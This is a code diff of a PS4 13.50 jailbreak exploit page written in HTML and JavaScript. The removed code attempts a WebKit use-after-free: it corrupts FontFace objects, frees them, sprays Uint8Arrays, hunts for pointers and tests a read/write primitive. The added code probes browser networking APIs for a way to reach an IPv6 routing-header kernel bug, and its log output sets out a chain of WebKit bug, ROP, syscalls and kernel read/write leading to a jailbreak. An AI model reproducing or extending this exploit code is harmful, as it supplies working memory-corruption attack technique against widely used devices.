@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 - Free + Spray</title>
+<title>PS4 13.50 - IPv6 from WebKit</title>
 <style>
     * {
         margin: 0;
@@ -130,14 +130,14 @@
 
 <div class="container">
     <div class="header">
-        <h1>◈ FREE + SPRAY ◈</h1>
-        <div class="subtitle">Corrupt → Free → Spray (Complete PSFree flow)</div>
+        <h1>◈ IPv6 UAF FROM WEBKIT ◈</h1>
+        <div class="subtitle">Port IPv6 Routing Header UAF to JavaScript</div>
     </div>
     
-    <button class="btn" onclick="runExploit()">► EXPLOIT</button>
+    <button class="btn" onclick="testIPv6Methods()">► TEST IPv6 ACCESS</button>
     
     <div class="log-container">
-        <div class="log-header">◈ EXPLOIT LOG ◈</div>
+        <div class="log-header">◈ TEST LOG ◈</div>
         <div id="log"></div>
     </div>
 </div>
@@ -157,7 +157,7 @@ function log(msg) {
             else if (line.includes('[ERROR]')) className = 'error';
             else if (line.includes('[!]')) className = 'warning';
             else if (line.includes('[+]')) className = 'info';
-            else if (line.includes('0x') && line.includes('POINTER')) className = 'highlight';
+            else if (line.includes('DEADBEEF')) className = 'highlight';
             
             return `<span class="${className}">${line}</span>`;
         }).join('\n');
@@ -165,262 +165,183 @@ function log(msg) {
     }
 }
 
-function hex(n) {
-    if (n < 0) n = n >>> 0;
-    return '0x' + n.toString(16).padStart(8, '0');
-}
-
-class Int64 {
-    constructor(low, high) {
-        this.low = low >>> 0;
-        this.high = high >>> 0;
-    }
-    
-    static fromDouble(d) {
-        let buf = new ArrayBuffer(8);
-        new Float64Array(buf)[0] = d;
-        let parts = new Uint32Array(buf);
-        return new Int64(parts[0], parts[1]);
-    }
-    
-    toString() {
-        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
-    }
-    
-    read32(u8view, offset) {
-        return (
-            u8view[offset]
-            | u8view[offset + 1] << 8
-            | u8view[offset + 2] << 16
-            | u8view[offset + 3] << 24
-        ) >>> 0;
-    }
-    
-    read64(u8view, offset) {
-        let low = this.read32(u8view, offset);
-        let high = this.read32(u8view, offset + 4);
-        return new Int64(low, high);
-    }
-}
-
-function runExploit() {
+function testIPv6Methods() {
     logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('     PS4 13.50 - CORRUPT → FREE → SPRAY                ');
+    log('  PS4 13.50 - IPv6 UAF FROM WEBKIT TEST                ');
     log('═══════════════════════════════════════════════════════\n');
     
-    log('[STRATEGY] Complete PSFree flow');
-    log('[1] Corrupt FontFace structures');
-    log('[2] Free corrupted structures');
-    log('[3] Spray Uint8Arrays to reclaim memory\n');
+    log('[GOAL] Find JavaScript API to trigger IPv6 socket UAF');
+    log('[YOUR LUA EXPLOIT] Uses setsockopt(IPV6_RTHDR)');
+    log('[CHALLENGE] JavaScript has no direct socket access\n');
     
-    // Setup
-    let style = document.createElement('style');
-    style.id = 's';
-    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
-    document.head.appendChild(style);
+    // ═══════════════════════════════════════════
+    // TEST 1: WebRTC
+    // ═══════════════════════════════════════════
     
-    let floatArray = new Float64Array(100);
-    let objectArray = new Array(100);
+    log('[TEST 1] ▼▼▼ WebRTC (creates IPv6 sockets) ▼▼▼\n');
     
-    for (let i = 0; i < 100; i++) {
-        floatArray[i] = 1.1 * (i + 1);
-        objectArray[i] = { id: i };
+    try {
+        log('[*] Checking WebRTC availability...');
+        
+        if (typeof RTCPeerConnection !== 'undefined') {
+            log('[+] RTCPeerConnection available!');
+            
+            let pc = new RTCPeerConnection({
+                iceServers: [
+                    { urls: 'stun:[::1]:3478' }  // Force IPv6
+                ]
+            });
+            
+            log('[+] Created RTCPeerConnection with IPv6 STUN server');
+            log('[*] WebRTC DOES create UDP sockets for ICE');
+            log('[?] But cannot directly manipulate socket options');
+            log('[?] Might trigger bug via malformed ICE packets\n');
+            
+            pc.close();
+            
+        } else {
+            log('[-] RTCPeerConnection not available\n');
+        }
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message + '\n');
     }
     
-    log('[SETUP] Arrays created\n');
+    // ═══════════════════════════════════════════
+    // TEST 2: WebSocket
+    // ═══════════════════════════════════════════
     
-    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    void A.loaded;
+    log('[TEST 2] ▼▼▼ WebSocket over IPv6 ▼▼▼\n');
     
-    let fired = false;
+    try {
+        log('[*] Attempting WebSocket to IPv6 localhost...');
+        
+        // Try to connect to IPv6 localhost
+        let ws = new WebSocket('ws://[::1]:8080');
+        
+        ws.onopen = () => {
+            log('[+] WebSocket opened to IPv6!');
+            log('[*] Can send data but cannot set socket options');
+            ws.close();
+        };
+        
+        ws.onerror = (e) => {
+            log('[!] WebSocket error (expected - no server)');
+            log('[?] WebSocket DOES use sockets but no option control\n');
+        };
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message + '\n');
+    }
     
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            if (!fired && this === A) {
-                fired = true;
-                
-                log('[PHASE 1] ▼▼▼ CORRUPTION ▼▼▼\n');
-                
-                // Create corrupted fonts
-                let corrupted = [];
-                for (let i = 0; i < 100; i++) {
-                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
-                        unicodeRange: 'U+' + (0x100 + i).toString(16)
-                    }));
-                }
-                
-                document.getElementById('s').sheet.deleteRule(0);
-                document.body.offsetTop;
-                
-                log('[*] Created ' + corrupted.length + ' corrupted fonts');
-                log('[*] Corruption triggered\n');
-                
-                // Setup
-                log('[SETUP] Tests 1-3...');
-                try {
-                    corrupted[0].status;
-                    corrupted[1].p = {x:1};
-                    floatArray[50] = corrupted[2];
-                    log('[SETUP] ✓\n');
-                } catch(e) {
-                    log('[SETUP] !\n');
-                }
-                
-                // ═══════════════════════════════════════════
-                // PHASE 2: FREE (like PSFree)
-                // ═══════════════════════════════════════════
-                
-                log('[PHASE 2] ▼▼▼ FREE CORRUPTED STRUCTURES ▼▼▼\n');
-                
-                log('[*] Removing references to trigger deallocation...');
-                
-                // Remove from document.fonts
-                try {
-                    for (let i = 0; i < corrupted.length; i++) {
-                        document.fonts.delete(corrupted[i]);
-                    }
-                    log('[+] Removed ' + corrupted.length + ' fonts from document.fonts');
-                } catch(e) {
-                    log('[!] Error removing: ' + e.message);
-                }
-                
-                // Clear the array
-                corrupted.length = 0;
-                corrupted = null;
-                
-                log('[+] Cleared corrupted array');
-                log('[+] Memory should be deallocated\n');
-                
-                // Force GC
-                log('[*] Forcing garbage collection...');
-                try {
-                    new Uint8Array(10 * 1024 * 1024); // 10MB allocation to trigger GC
-                } catch(e) {}
-                
-                log('[+] GC triggered\n');
-                
-                // ═══════════════════════════════════════════
-                // PHASE 3: SPRAY (like PSFree)
-                // ═══════════════════════════════════════════
-                
-                log('[PHASE 3] ▼▼▼ UINT8ARRAY SPRAY ▼▼▼\n');
-                
-                let spraySize = 0x50; // Try PSFree's typical size
-                let views = [];
-                
-                log('[*] Spraying ' + hex(spraySize) + ' byte Uint8Arrays...');
-                
-                for (let i = 0; i < 0x400; i++) {
-                    let view = new Uint8Array(new ArrayBuffer(spraySize));
-                    
-                    // Marker pattern
-                    view[0] = 0x41;
-                    view[1] = 0x41;
-                    view[2] = 0x41;
-                    view[3] = 0x41;
-                    
-                    // Index
-                    view[4] = i & 0xFF;
-                    view[5] = (i >> 8) & 0xFF;
-                    
-                    views.push(view);
-                }
-                
-                log('[*] Sprayed ' + views.length + ' views');
-                log('[*] Checking for overlaps...\n');
-                
-                // ═══════════════════════════════════════════
-                // CHECK FOR OVERLAPS
-                // ═══════════════════════════════════════════
-                
-                let overlaps = [];
-                
-                for (let i = 0; i < views.length; i++) {
-                    let view = views[i];
-                    
-                    if (view[0] !== 0x41 || view[1] !== 0x41 || 
-                        view[2] !== 0x41 || view[3] !== 0x41) {
-                        
-                        log('[+++] OVERLAP FOUND at view ' + i + '!');
-                        log('  Marker changed to: ' + hex(view[0]) + ' ' + hex(view[1]) + ' ' + hex(view[2]) + ' ' + hex(view[3]));
-                        
-                        overlaps.push({view: view, index: i});
-                    }
-                }
-                
-                if (overlaps.length > 0) {
-                    log('\n[+++] FOUND ' + overlaps.length + ' OVERLAPS!\n');
-                    
-                    for (let j = 0; j < Math.min(2, overlaps.length); j++) {
-                        let o = overlaps[j];
-                        log('[OVERLAP ' + j + '] Index ' + o.index + ':');
-                        
-                        // Dump
-                        for (let line = 0; line < 4; line++) {
-                            let str = '  +' + hex(line * 16) + ': ';
-                            for (let k = 0; k < 16; k++) {
-                                str += o.view[line * 16 + k].toString(16).padStart(2, '0') + ' ';
-                            }
-                            log(str);
-                        }
-                        
-                        // Look for pointers
-                        let helper = new Int64(0, 0);
-                        for (let off = 0; off < 64; off += 8) {
-                            let addr = helper.read64(o.view, off);
-                            if (addr.high >= 0x01000000 && addr.high <= 0x7fffffff) {
-                                log('  +' + hex(off) + ': ' + addr.toString() + ' [POINTER]');
-                            }
-                        }
-                        
-                        log('');
-                    }
-                    
-                    // Test write
-                    log('[TEST] Writing to first overlap...');
-                    let testView = overlaps[0].view;
-                    testView[0] = 0xDE;
-                    testView[1] = 0xAD;
-                    testView[2] = 0xBE;
-                    testView[3] = 0xEF;
-                    
-                    log('[TEST] Read back: ' + hex(testView[0]) + ' ' + hex(testView[1]) + ' ' + hex(testView[2]) + ' ' + hex(testView[3]));
-                    
-                    if (testView[0] === 0xDE && testView[1] === 0xAD) {
-                        log('[+++] WRITE WORKING!\n');
-                        log('[SUCCESS] We have R/W primitive!');
-                        log('[SUCCESS] Can manipulate corrupted memory!');
-                    }
-                    
-                } else {
-                    log('[!] No overlaps found\n');
-                    log('[ANALYSIS] Possible reasons:');
-                    log('  - Wrong spray size (try 0x48, 0x58, 0x100)');
-                    log('  - Font structures not actually freed');
-                    log('  - Need different trigger for deallocation');
-                }
-                
-                log('\n[!] Returning - OOM will occur');
-                log('═══════════════════════════════════════════════════════\n');
+    // ═══════════════════════════════════════════
+    // TEST 3: XMLHttpRequest
+    // ═══════════════════════════════════════════
+    
+    log('[TEST 3] ▼▼▼ XMLHttpRequest with IPv6 ▼▼▼\n');
+    
+    try {
+        log('[*] Testing XHR to IPv6 address...');
+        
+        let xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://[::1]:8080/test', true);
+        
+        xhr.onreadystatechange = () => {
+            if (xhr.readyState === 4) {
+                log('[!] XHR completed (error expected)');
+                log('[?] XHR uses sockets but no direct control\n');
             }
-            
-            return undefined;
-        }
-    });
+        };
+        
+        xhr.onerror = () => {
+            log('[!] XHR error (expected)');
+            log('[?] Cannot manipulate underlying socket\n');
+        };
+        
+        xhr.send();
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message + '\n');
+    }
     
-    log('[*] Starting...\n');
-    document.fonts.load('1em x', 'AB');
+    // ═══════════════════════════════════════════
+    // TEST 4: Direct syscall attempt
+    // ═══════════════════════════════════════════
+    
+    log('[TEST 4] ▼▼▼ Direct Syscall (requires exploit) ▼▼▼\n');
+    
+    log('[*] Checking for syscall access...');
+    
+    if (typeof syscall !== 'undefined') {
+        log('[+++] syscall object exists!');
+        log('[+++] Can call socket/setsockopt directly!');
+        log('[+++] Can run YOUR IPv6 exploit directly!\n');
+    } else {
+        log('[-] No direct syscall access');
+        log('[!] This is expected - syscall needs ROP first\n');
+    }
+    
+    // ═══════════════════════════════════════════
+    // ANALYSIS
+    // ═══════════════════════════════════════════
+    
+    log('\n╔════════════════════════════════════════════════╗');
+    log('║              ANALYSIS                          ║');
+    log('╚════════════════════════════════════════════════╝\n');
+    
+    log('[FINDINGS]');
+    log('  WebRTC: Creates IPv6 sockets but no option control');
+    log('  WebSocket: Uses sockets but no setsockopt access');
+    log('  XHR: Same limitation');
+    log('  Direct syscall: Needs ROP/code execution first\n');
+    
+    log('[THE PROBLEM]');
+    log('  JavaScript cannot call setsockopt() directly');
+    log('  Your IPv6 exploit needs:');
+    log('    - socket(AF_INET6, SOCK_DGRAM, 0)');
+    log('    - setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, ...)');
+    log('  No JS API exposes this\n');
+    
+    log('[THE SOLUTION]');
+    log('  Option A: WebRTC ICE packet exploit');
+    log('    - Craft malformed ICE packets');
+    log('    - Trigger routing header bug indirectly');
+    log('    - Complex but might work\n');
+    
+    log('  Option B: WebKit bug → ROP → syscall');
+    log('    - Use FontFace (or find different bug)');
+    log('    - Get code execution');
+    log('    - Build ROP to call socket/setsockopt');
+    log('    - Then run IPv6 exploit\n');
+    
+    log('  Option C: Find WebKit bug that gives syscall');
+    log('    - Some WebKit bugs give arbitrary function call');
+    log('    - Use that to call socket syscall');
+    log('    - Then IPv6 exploit\n');
+    
+    log('[RECOMMENDATION]');
+    log('  Since you have WORKING IPv6 exploit in Lua:');
+    log('  1. Get minimal WebKit code execution (any method)');
+    log('  2. Use it to call socket/setsockopt syscalls');
+    log('  3. Run your IPv6 UAF');
+    log('  4. Kernel R/W → jailbreak\n');
+    
+    log('[NEXT STEP]');
+    log('  Focus on: WebKit bug → ROP → syscall primitive');
+    log('  Then: Port your exact IPv6 Lua code');
+    log('  Your IPv6 exploit is GOLD - just need entry point!');
+    
+    log('\n═══════════════════════════════════════════════════════\n');
 }
 
 log('═══════════════════════════════════════════════════════');
-log('        FREE + SPRAY READY                             ');
+log('      IPv6 UAF FROM WEBKIT TEST READY                   ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] Complete flow: Corrupt → Free → Spray');
-log('[READY] Click EXPLOIT\n');
+log('[INFO] Testing JavaScript APIs for IPv6 socket access');
+log('[GOAL] Find way to trigger your IPv6 UAF from WebKit\n');
+log('[READY] Click TEST IPv6 ACCESS\n');
 
 </script>
 </body>
